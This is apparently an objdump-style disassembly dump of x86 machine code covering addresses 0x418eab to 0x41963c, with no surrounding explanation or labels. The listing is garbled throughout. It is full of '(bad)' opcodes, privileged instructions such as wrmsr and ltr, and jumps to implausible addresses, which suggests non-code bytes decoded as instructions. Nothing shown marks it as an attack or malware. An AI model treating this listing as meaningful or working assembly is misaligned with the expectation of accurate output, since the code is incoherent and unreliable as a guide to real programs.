  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
